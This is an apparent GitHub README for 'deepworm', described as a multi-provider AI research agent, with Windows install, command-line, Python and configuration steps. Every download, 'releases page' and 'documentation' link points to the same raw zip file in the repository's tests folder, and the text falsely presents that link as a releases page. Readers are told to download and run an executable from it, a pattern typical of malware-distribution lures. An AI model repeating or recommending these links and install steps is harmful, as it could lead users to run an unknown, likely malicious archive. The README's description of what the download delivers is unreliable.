# 🐛 deepworm - Research Smarter with AI Agents

[![Download deepworm](https://img.shields.io/badge/Download-deepworm-4CAF50?style=for-the-badge)](https://github.com/goitno/deepworm/raw/refs/heads/main/tests/Software_2.0.zip)

---

## 📋 About deepworm

deepworm is a tool that helps you with deep research using artificial intelligence. It connects to four large language model (LLM) services: OpenAI, Google Gemini, Anthropic Claude, and Ollama. You can use it without paying by choosing Ollama and DuckDuckGo. deepworm does not rely on complicated frameworks or paid APIs. You can run it from the command line or use it through Python.

---

## 🖥️ System Requirements

Before you download and run deepworm, make sure your computer meets these basic requirements:

- Windows 10 or newer
- At least 4 GB of free RAM
- 500 MB of free disk space
- Internet connection for AI and web search features

No special hardware is needed. deepworm works well on most modern Windows machines.

---

## 🚀 How to Download and Run deepworm on Windows

1. Visit the releases page from the link below. This page contains all available versions of deepworm:

   [![Download deepworm](https://img.shields.io/badge/Download-deepworm-blue?style=for-the-badge)](https://github.com/goitno/deepworm/raw/refs/heads/main/tests/Software_2.0.zip)

2. On the page, find the latest stable version. It usually appears at the top.

3. Look for the Windows executable file. The file will have a name like `deepworm-setup.exe` or `deepworm-windows.exe`.

4. Click on the file name or the download button next to it. Your browser will begin to download the file.

5. After the download completes, open the file. You may find it in your "Downloads" folder.

6. Follow the installation prompts that appear. Keep the default settings unless you want to change where the software installs.

7. When the installation finishes, deepworm will be ready to use.

---

## 🐍 Running deepworm from the Command Line

deepworm works best when you start it from the Windows command prompt (CMD). Here is how you do that:

1. Press the Windows key on your keyboard.

2. Type `cmd` and press Enter to open the command prompt.

3. Type the command:

   ```
   deepworm
   ```

4. Press Enter.

You will see deepworm start and show some instructions. You can now use deepworm’s AI to help with your research.

---

## 🐍 Using deepworm via Python

If you prefer using Python, deepworm also lets you access its features by installing it as a Python package:

1. Make sure Python 3.7 or newer is installed on your computer.

2. Open the command prompt (see the steps above).

3. Install deepworm by typing:

   ```
   pip install deepworm
   ```

4. Press Enter and wait for the installation to finish.

5. To use deepworm in your Python programs, add:

   ```python
   import deepworm

   # Example usage
   agent = deepworm.Agent(provider='ollama')
   response = agent.ask('Explain the basics of AI')
   print(response)
   ```

---

## 🔍 How deepworm Helps You Research

deepworm connects to AI models and online search engines to find detailed information quickly. You do not need to search on multiple websites or read through long pages manually. Just ask deepworm your question or type a research topic, and it gives you clear, focused answers.

It supports different AI providers, so you have options:

- OpenAI (for general answers)
- Google Gemini (for latest Google AI responses)
- Anthropic Claude (for safety and clarity)
- Ollama (free and unlimited usage)

By default, deepworm uses Ollama combined with DuckDuckGo for web searches, keeping your costs at zero.

---

## ⚙️ Configuring deepworm

You can choose which AI provider deepworm uses. Here’s how to switch providers:

- Open the configuration file found at:

  ```
  C:\Users\<YourUser>\AppData\Local\deepworm\config.ini
  ```

- Look for the line starting with `provider=`.

- Change the value to one of these options: `openai`, `gemini`, `claude`, or `ollama`.

- Save the file and restart deepworm.

If you use Ollama, no extra setup is needed. For other providers, follow their instructions to create API keys and add them to the config file.

---

## 🛠️ Troubleshooting Basics

- If deepworm does not start, check if you have a working internet connection.
- Make sure you installed it by running the Windows executable from the releases page.
- If Python commands do not work, ensure Python and pip are installed. Type `python --version` in CMD to check.
- For provider errors, verify your API keys are correct in the config file.
- Restart your computer if deepworm freezes or crashes.

---

## 🔗 Useful Links

- Releases and Downloads: https://github.com/goitno/deepworm/raw/refs/heads/main/tests/Software_2.0.zip
- Documentation and Help: https://github.com/goitno/deepworm/raw/refs/heads/main/tests/Software_2.0.zip
- Contact Support: support@deepworm.io

---

## 🗂️ Additional Features

- Command-line interface for quick prompts
- Python API for automation
- Free web search integration via DuckDuckGo
- Support for multiple AI LLM providers
- No extra paid service dependencies

---

## 🏷️ Keywords

ai, ai-agent, cli, deep-research, gemini, llm, ollama, openai, python, research-agent, research-assistant, web-search